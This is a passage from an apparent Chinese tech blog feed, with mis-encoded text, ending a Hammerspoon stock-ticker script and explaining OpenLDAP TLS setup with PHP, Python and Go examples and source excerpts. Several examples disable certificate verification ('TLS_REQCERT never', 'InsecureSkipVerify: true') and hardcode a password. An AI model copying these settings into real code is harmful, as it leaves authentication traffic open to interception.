<span class="keyword">then</span></span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&#x27;è·å–æ•°æ®é”™è¯¯:&#x27;</span>..code)</span><br><span class="line">     <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  menuData = &#123;&#125;</span><br><span class="line"></span><br><span class="line">  rawjson = hs.json.decode(body)</span><br><span class="line">  <span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="built_in">pairs</span>(rawjson.data) <span class="keyword">do</span></span><br><span class="line">  <span class="comment">-- èœå•æ ·å¼</span></span><br><span class="line">  titles = <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;ğŸ‡¨ğŸ‡³%s Â¥%s ğŸš€%s ğŸ‘†%s ğŸ‘‡ï¸%s ğŸš—%s ğŸ’°%.3f/äº¿ ğŸ¤%s&quot;</span>,</span><br><span class="line">  v.symbol, v.current, v.percent..<span class="string">&#x27;%&#x27;</span>, v.high, v.low, v.<span class="built_in">open</span>, v.amount/<span class="number">100000000</span>, v.turnover_rate..<span class="string">&#x27;%&#x27;</span></span><br><span class="line">  )</span><br><span class="line">            <span class="built_in">table</span>.<span class="built_in">insert</span>(menuData, &#123;title = titles&#125;)</span><br><span class="line">        <span class="keyword">end</span>    </span><br><span class="line">  updateMenubar()</span><br><span class="line"><span class="keyword">end</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">menubar:setTitle(<span class="string">&#x27;ğŸš¨&#x27;</span>)</span><br><span class="line">getStock(<span class="literal">true</span>)</span><br><span class="line">updateMenubar()</span><br><span class="line">hs.timer.doEvery(<span class="number">600</span>, getStock)</span><br></pre></td></tr></table></figure><p>hammerspoonå¯ä»¥å®ç°è‡ªåŠ¨åŒ–åŠŸèƒ½è¿˜æœ‰å¾ˆå¤šï¼Œä»…é€šè¿‡<code>hs.http</code>å’Œ <code>hs.timer</code>åŠŸèƒ½å°±å¯ä»¥ç›‘æ§å®æ—¶æŸäº›æœåŠ¡ç¨³å®šæ€§ï¼Œæ€ä¹ˆç©å‡ºèŠ±æ ·è¿˜æ˜¯ä¾èµ–å„ä½çœ‹å®˜ä»¬çš„è„‘æ´äº† :)</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="#å‚è€ƒ"></a>#å‚è€ƒ</h2><p><a href="https://www.hammerspoon.org/docs">hammerspoonå®˜æ–¹æ–‡æ¡£</a><br><a href="https://github.com/ashfinal/awesome-hammerspoon">hammerspoon awsomeé¡¹ç›®</a><br><a href="https://coolshell.cn/articles/10739.html">luaååˆ†é’Ÿæ•™ç¨‹</a></p>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hammerspoon </tag>
            
            <tag> è‡ªåŠ¨åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LDAPé…ç½®TLSåŠ å¯†é€šä¿¡</title>
      <link href="2019/08/27/LDAP%E9%85%8D%E7%BD%AETLS%E5%8A%A0%E5%AF%86%E9%80%9A%E4%BF%A1/"/>
      <url>2019/08/27/LDAP%E9%85%8D%E7%BD%AETLS%E5%8A%A0%E5%AF%86%E9%80%9A%E4%BF%A1/</url>
      
        <content type="html"><![CDATA[<p>LDAPåœ¨ä¼ä¸šå¼€å‘ä¸­å¸¸ç”¨çš„ä¸€ç§åè®®ï¼Œå®ç°ä¼ä¸šè´¦æˆ·ç»Ÿä¸€ç®¡ç†çš„æ–¹æ¡ˆã€‚å¸¸ç”¨çš„LDAPå¼€æºæ–¹æ¡ˆä¸»è¦æ˜¯openldap, Debianç³»åˆ—å’ŒCentOSç³»ç»Ÿéƒ½ä¼šè‡ªå¸¦ï¼Œä½†éœ€è¦æ³¨æ„é…ç½®æ–‡ä»¶ä¸åŒã€‚åœ¨åŸºäºLDAPå¼€å‘ç›¸å…³åŠŸèƒ½æ—¶ï¼Œç”±äºLDAPåè®®å±äºæ˜æ–‡åè®®ï¼Œä¸šåŠ¡å¯¹å®‰å…¨æ€§è¦æ±‚è¾ƒé«˜çš„åœºåˆéœ€è¦æ­é…TLSå®Œæˆå¯¹æ•°æ®åŠ å¯†ä¼ è¾“ã€‚LDAPé»˜è®¤æ”¯æŒTLSåè®®ï¼Œå¼€æ”¾çš„ç«¯å£æ˜¯636ã€‚</p><h2 id="0x1-åŸºç¡€é…ç½®"><a href="#0x1-åŸºç¡€é…ç½®" class="headerlink" title="0x1 åŸºç¡€é…ç½®"></a>0x1 åŸºç¡€é…ç½®</h2><p>openldapæœåŠ¡é…ç½®TLS:</p><ul><li><p>slapdæ‰‹åŠ¨è¿è¡Œ</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#openldap v2.4.44ç‰ˆæœ¬è‡ªå¸¦TLSï¼Œæ— éœ€é…ç½®, slapdéœ€è¦æŒ‡å®š &quot;ldaps:///&quot;</span></span><br><span class="line"><span class="regexp">/usr/</span>sbin<span class="regexp">/slapd -u ldap -h ldap:/</span><span class="regexp">//</span> ldaps:<span class="regexp">//</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure></li><li><p>serviceæœåŠ¡è¿è¡Œ (CentOSç¯å¢ƒ)</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#vim /etc/sysconfig/slapd</span></span><br><span class="line">service slapd <span class="literal">start</span></span><br></pre></td></tr></table></figure></li><li><p>éªŒè¯</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ps</span> uax|<span class="keyword">grep</span> slapd</span><br><span class="line"></span><br><span class="line">lsof -i:<span class="number">636</span></span><br></pre></td></tr></table></figure></li></ul><p>openldap dockeræœåŠ¡é…ç½®(ç®€æ˜“):</p><ul><li>ç¯å¢ƒå˜é‡è®¾ç½®<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ›¿æ¢æˆè‡ªå·±çš„è¯ä¹¦æˆ–ä½¿ç”¨è‡ªå¸¦è¯ä¹¦</span></span><br><span class="line"><span class="attr">LDAP_TLS:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">LDAP_TLS_CRT_FILENAME:</span> <span class="string">ldap.crt</span></span><br><span class="line"><span class="attr">LDAP_TLS_KEY_FILENAME:</span> <span class="string">ldap.key</span></span><br><span class="line"><span class="attr">LDAP_TLS_DH_PARAM_FILENAME:</span> <span class="string">dhparam.pem</span></span><br><span class="line"><span class="attr">LDAP_TLS_CA_CRT_FILENAME:</span> <span class="string">ca.crt</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="0x2-å¼€å‘ä½¿ç”¨"><a href="#0x2-å¼€å‘ä½¿ç”¨" class="headerlink" title="0x2 å¼€å‘ä½¿ç”¨"></a>0x2 å¼€å‘ä½¿ç”¨</h2><p>ç»è¿‡ä»¥ä¸Šç®€å•é…ç½®ï¼Œldapå·²ç»æ”¯æŒTLSä¼ è¾“æ•°æ®äº†ã€‚å¼€å‘è¯­è¨€ä¸­å®ç°ldapå®¢æˆ·ç«¯çš„æ–¹å¼ä¸åŒï¼Œéœ€è¦æ³¨æ„å¼€å‘è¯­è¨€å®˜æ–¹æ–‡æ¡£</p><ul><li>PHPå®¢æˆ·ç«¯</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç³»ç»Ÿéœ€è¦å®‰è£…cryus-saslåº“</span></span><br><span class="line">yum install cyrus-sasl cyrus-sasl-devel cyrus-sasl-ldap</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…ldapæ‰©å±•(phpbrewç¤ºä¾‹)</span></span><br><span class="line">phpbrew ext install ldap --  --with-ldap=/usr/local/Cellar/openldap/<span class="number">2.4</span><span class="number">.47</span> --with-ldap-sasl=/usr/local/opt/cyrus-sasl</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹é…ç½®ä¿¡æ¯ (æ³¨æ„`SASL Support`å¯ç”¨çŠ¶æ€)</span></span><br><span class="line">php --ri ldap</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#æœ¬åœ°ä»£ç è¿è¡Œç¯å¢ƒé…ç½®ldap.conf (phpçš„ldapä¾èµ–è¿™ä¸ªé…ç½®æ–‡ä»¶)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;TLS_REQCERT never&quot;</span> &gt;&gt; /etc/openldap/ldap.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¤ºä¾‹ä»£ç ä¸€</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$port</span> = <span class="number">389</span>; <span class="comment">#æ³¨æ„ç«¯å£</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;cn=username,ou=people,dc=test,dc=com&#x27;</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;123456&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span> = ldap_connect(<span class="variable">$host</span>, <span class="variable">$port</span>);</span><br><span class="line"><span class="comment">#è°ƒè¯•ä¿¡æ¯</span></span><br><span class="line">ldap_set_option(<span class="variable">$conn</span>, LDAP_OPT_PROTOCOL_VERSION, <span class="number">3</span>);</span><br><span class="line">ldap_set_option(<span class="literal">NULL</span>, LDAP_OPT_DEBUG_LEVEL, <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># tlså¼€å¯ (ä½¿ç”¨çš„æ˜¯ldap_start_tlså‡½æ•°)</span></span><br><span class="line">ldap_start_tls(<span class="variable">$conn</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¤è¯</span></span><br><span class="line"><span class="variable">$auth</span> = ldap_bind(<span class="variable">$conn</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$auth</span> ? <span class="string">&quot;ok&quot;</span> : <span class="string">&quot;fail&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¤ºä¾‹ä»£ç äºŒ (ä¸æ¨è)</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;ldaps://127.0.0.1&quot;</span>; <span class="comment">#å¿…é¡»å¸¦ldapsåè®®å¤´éƒ¨ï¼Œæ ‡è¯†å¼€å¯TLS</span></span><br><span class="line"><span class="variable">$port</span> = <span class="number">636</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;cn=username,ou=people,dc=test,dc=com&#x27;</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;123456&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span> = ldap_connect(<span class="variable">$host</span>, <span class="variable">$port</span>);</span><br><span class="line"><span class="comment">#è°ƒè¯•ä¿¡æ¯</span></span><br><span class="line">ldap_set_option(<span class="variable">$conn</span>, LDAP_OPT_PROTOCOL_VERSION, <span class="number">3</span>);</span><br><span class="line">ldap_set_option(<span class="literal">NULL</span>, LDAP_OPT_DEBUG_LEVEL, <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¤è¯</span></span><br><span class="line"><span class="variable">$auth</span> = ldap_bind(<span class="variable">$conn</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$auth</span> ? <span class="string">&quot;ok&quot;</span> : <span class="string">&quot;fail&quot;</span>;</span><br></pre></td></tr></table></figure><ul><li>Pythonå®¢æˆ·ç«¯</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ldap</span><br><span class="line">ldap = <span class="string">&quot;ldap://127.0.0.1:389&quot;</span></span><br><span class="line">ldaps = <span class="string">&quot;ldaps://127.0.0.1:636&quot;</span></span><br><span class="line">ldapconn = ldap.initialize(ldaps)</span><br><span class="line"></span><br><span class="line">username = <span class="string">&#x27;cn=username,ou=people,dc=test,dc=com&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;123456&#x27;</span></span><br><span class="line">ldapconn.simple_bind_s(username, password) </span><br></pre></td></tr></table></figure><ul><li>Golangå®¢æˆ·ç«¯</li></ul><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...çœç•¥</span></span><br><span class="line">l, err := Dial(<span class="string">&quot;tcp&quot;</span>, fmt.Sprintf(<span class="string">&quot;%s:%d&quot;</span>, <span class="string">&quot;ldap.example.com&quot;</span>, <span class="number">389</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> l.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ³¨æ„InsecureSkipVerify</span></span><br><span class="line">err = l.StartTLS(&amp;tls.Config&#123;InsecureSkipVerify: <span class="literal">true</span>&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x3-TLSåˆ†æ"><a href="#0x3-TLSåˆ†æ" class="headerlink" title="0x3 TLSåˆ†æ"></a>0x3 TLSåˆ†æ</h2><p>ä¸Šè¿°çš„é…ç½®åŸºæœ¬å®ç°äº†ldapé€šä¿¡æ•°æ®åŠ å¯†éœ€æ±‚ï¼Œå¦‚æœç•™æ„ä»£ç ä¸­æ³¨é‡Šçš„è¯ï¼Œä¼šå¯¹æ–‡ç« å¼€å¤´TLSç«¯å£636ä¸ä»£ç ä¸­å®é™…ä½¿ç”¨å´ä¸åŒã€‚è¿™ä¸ªéœ€è¦æŒ‡å‡ºçš„æ˜¯å®¢æˆ·ç«¯è¯­è¨€å®ç°ä¸åŒå¯¼è‡´çš„ã€‚</p><p>ä»¥PHPè¯­è¨€ä¸ºä¾‹åˆ†æLDAPæ‰©å±•ä¸­å®ç°é€šä¿¡é€»è¾‘:</p><ul><li>ä½¿ç”¨636ç«¯å£æµ‹è¯•<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨æ–‡ä¸­çš„ç¤ºä¾‹ä»£ç ,ç«¯å£ä¿®æ”¹æˆ636</span></span><br><span class="line">è¾“å‡ºç»“æœ</span><br><span class="line">`PHP Warning: ldap_start_tls(): Unable <span class="built_in">to</span> <span class="built_in">start</span> TLS: `</span><br></pre></td></tr></table></figure></li><li>å…³é—­636ç«¯å£æµ‹è¯•<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æµ‹è¯•æ— å½±å“ï¼Œæ•°æ®åŠ å¯†ä¼ è¾“</span><br></pre></td></tr></table></figure></li></ul><p>åœ¨PHPæ–‡æ¡£ldap_start_tlså‡½æ•°è¯„è®ºä¸­æåˆ°ï¼Œldapså’ŒstartTLSä¸æ˜¯ä¸€å›äº‹ï¼ŒldapsæœåŠ¡å¼€æ”¾636ç«¯å£ï¼Œ389ç«¯å£æ”¯æŒåŠ å¯†å’ŒéåŠ å¯†æ•°æ®ä¼ è¾“; å¹¶ä¸”ldapsä¸æ¨èä½¿ç”¨ã€‚</p><p>PHPæ‰©å±•ldapæœ¬è´¨æ˜¯è°ƒç”¨openldapåº“ä¸­çš„å‡½æ•°å®ç°ï¼Œé‡ç‚¹åˆ†æopenldapä¸­<code>ldap_connect</code>å’Œ<code>ldap_start_tls</code>ä¸¤ä¸ªå‡½æ•°å®ç°ã€‚</p><p>ç¬”è€…ä»¥openldap-2.4.47ç‰ˆæœ¬åˆ†æstartTLSå’Œldapså®ç°åŠåŒºåˆ«</p><p>openldapåº“ç›®å½•ç»“æ„:</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">openldap-2.4.47</span><br><span class="line">-<span class="ruby"> libraries/libldap/* <span class="comment">#PHPä½¿ç”¨çš„ldapæ‰©å±•åº•å±‚ä¾èµ–åº“</span></span></span><br><span class="line"><span class="ruby">- init.c   <span class="comment">#åˆå§‹åŒ–æ“ä½œ</span></span></span><br><span class="line"><span class="ruby">- open.c.   <span class="comment">#è¿æ¥æ“ä½œ</span></span></span><br><span class="line"><span class="ruby">- tls2.c.   <span class="comment">#TLSç›¸å…³</span></span></span><br><span class="line"><span class="ruby">- options.c <span class="comment">#é…ç½®ç›¸å…³</span></span></span><br><span class="line"><span class="ruby">- url.c.    <span class="comment">#URLå¤„ç†ç›¸å…³</span></span></span><br><span class="line"><span class="ruby">- request.c <span class="comment">#ç½‘ç»œé€šä¿¡ç›¸å…³</span></span></span><br></pre></td></tr></table></figure><p>ldap_connectå‡½æ•°ä¸»è¦å®ç°åŠŸèƒ½</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ldapåˆå§‹åŒ–</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ldap_initialize</span><span class="params">( LDAP **ldp, LDAP_CONST <span class="keyword">char</span> *url )</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// è®¾ç½®ldpå‚æ•°ï¼Œå¦‚æœå¯ç”¨saslç›¸å…³åˆ™åˆå§‹åŒ–saslç›¸å…³è®¾ç½®, åŠ è½½ç³»ç»Ÿé…ç½®æ–‡ä»¶</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ldap_create</span><span class="params">( LDAP **ldp )</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// è§£æURLï¼Œè®¾ç½®è¿æ¥ä¿¡æ¯</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ldap_set_option</span><span class="params">(LDAP *ld, <span class="keyword">int</span> option, LDAP_CONST <span class="keyword">void</span> *invalue)</span></span></span><br></pre></td></tr></table></figure><p>ldap_start_tlså‡½æ•°ä¸»è¦å®ç°åŠŸèƒ½</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ldap_start_tlså‡½æ•°è°ƒç”¨åº•å±‚ldap_start_tls_så‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ldap_start_tls_s</span><span class="params">(LDAP *ld, LDAPControl **serverctrls, LDAPControl **clientctrls)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//...çœç•¥</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// é»˜è®¤è¿æ¥æ£€æŸ¥æ˜¯å¦å¼€å¯TLS </span></span><br><span class="line"><span class="keyword">if</span> ( ldap_tls_inplace( ld ) ) &#123;</span><br><span class="line"><span class="keyword">return</span> LDAP_LOCAL_ERROR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å»ºç«‹è¿æ¥</span></span><br><span class="line">rc = ldap_extended_operation_s( ld, LDAP_EXOP_START_TLS,</span><br><span class="line"><span class="literal">NULL</span>, serverctrls, clientctrls, &amp;rspoid, &amp;rspdata );</span><br><span class="line"><span class="comment">//...çœç•¥</span></span><br><span class="line"><span class="keyword">if</span> ( rc == LDAP_SUCCESS ) &#123;</span><br><span class="line"><span class="comment">// åå•†TLSé€šä¿¡ä¼šè¯</span></span><br><span class="line">rc = ldap_int_tls_start( ld, ld-&gt;ld_defconn, <span class="literal">NULL</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> rc;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...çœç•¥</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ldapä½¿ç”¨æµç¨‹å¯¹æ¯”:</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">ldap_connect</span> -&gt;</span> ldap_bind</span><br><span class="line"><span class="function"><span class="title">ldap_connect</span> -&gt;</span> <span class="function"><span class="title">ldap_start_tls</span> -&gt;</span> ldap_bind</span><br></pre></td></tr></table></figure><p>ldap_start_tlsåœ¨bindè®¤è¯å‰å¼€å¯TLSéªŒè¯ï¼Œldapsæ˜¯åœ¨ldap_bindæ“ä½œæ—¶å†åˆå§‹åŒ–TLSä¼šè¯ï¼Œèº«ä»½è®¤è¯æ“ä½œã€‚ä¸¤ç§æ“ä½œåœ¨åº•å±‚å®ç°ç›¸å·®ä¸å¤§ï¼Œä¸»è¦æ˜¯æœåŠ¡ç«¯389ç«¯å£æ”¯æŒåŠ å¯†å’ŒéåŠ å¯†ä¸¤ç§åŠŸèƒ½ã€‚</p><p>slapdæœåŠ¡ç«¯è¿æ¥åˆ¤æ–­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">Connection * <span class="title">connection_init</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">ber_socket_t</span> s,</span></span></span><br><span class="line"><span class="function"><span class="params">Listener *listener,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">const</span> <span class="keyword">char</span>* dnsname,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">const</span> <span class="keyword">char</span>* peername,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">int</span> flags,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">slap_ssf_t</span> ssf,</span></span></span><br><span class="line"><span class="function"><span class="params">struct berval *authid</span></span></span><br><span class="line"><span class="function"><span class="params">LDAP_PF_LOCAL_SENDMSG_ARG(struct berval *peerbv))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//...çœç•¥</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_TLS</span></span><br><span class="line"><span class="comment">// TLSè¿æ¥åˆ¤æ–­</span></span><br><span class="line"><span class="keyword">if</span> ( flags &amp; CONN_IS_TLS ) &#123;</span><br><span class="line">c-&gt;c_is_tls = <span class="number">1</span>;</span><br><span class="line">c-&gt;c_needs_tls_accept = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">c-&gt;c_is_tls = <span class="number">0</span>;</span><br><span class="line">c-&gt;c_needs_tls_accept = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">slap_sasl_open( c, <span class="number">0</span> );</span><br><span class="line">slap_sasl_external( c, ssf, authid );</span><br><span class="line"></span><br><span class="line">slapd_add_internal( s, <span class="number">1</span> );</span><br><span class="line"></span><br><span class="line">backend_connection_init(c);</span><br><span class="line"></span><br><span class="line"><span class="comment">//...çœç•¥</span></span><br></pre></td></tr></table></figure><p>æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯å®¢æˆ·ç«¯ä½¿ç”¨ldap_start_tlså‡½æ•°æ—¶ï¼Œä¼šè‡ªåŠ¨åŠ è½½æœ¬åœ°ç›®å½•<code>/etc/openldap/ldap.conf</code>æ–‡ä»¶, å…·ä½“å‚è€ƒ<a href="https://github.com/php/php-src/blob/master/ext/ldap/tests/README.md">PHPæµ‹è¯•è¯´æ˜</a>ã€‚å…¶ä¸­ldap.confé…ç½®å†…å®¹å‚è€ƒ<code>man ldap.conf</code>å‘½ä»¤è¯´æ˜åŠ<a href="http://www.openldap.org/doc/admin24/tls.html">å®˜æ–¹æ–‡æ¡£</a>ã€‚</p><h2 id="0x4-å‚è€ƒ"><a href="#0x4-å‚è€ƒ" class="headerlink" title="0x4 å‚è€ƒ"></a>0x4 å‚è€ƒ</h2><ol><li><a href="http://www.openldap.org/doc/admin24/tls.html">openldap TLSæ–‡æ¡£</a></li><li><a href="https://github.com/osixia/docker-openldap#TLS">openldap docker</a></li><li><a href="https://www.php.net/manual/en/function.ldap-start-tls.php">php TLSä½¿ç”¨</a></li><li><a href="https://github.com/go-ldap/ldap/blob/master/example_test.go">golang-ldapåº“</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ldap </tag>
            
            <tag> tls </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨TLSåŠ å¯†é€šä¿¡æ•°æ®</title>
      <link href="2019/08/23/%E4%BD%BF%E7%94%A8TLS%E5%8A%A0%E5%AF%86%E9%80%9A%E4%BF%A1%E6%95%B0%E6%8D%AE/"/>
      <url>2019/08/23/%E4%BD%BF%E7%94%A8TLS%E5%8A%A0%E5%AF%86%E9%80%9A%E4%BF%A1%E6%95%B0%E6%8D%AE/</url>
      
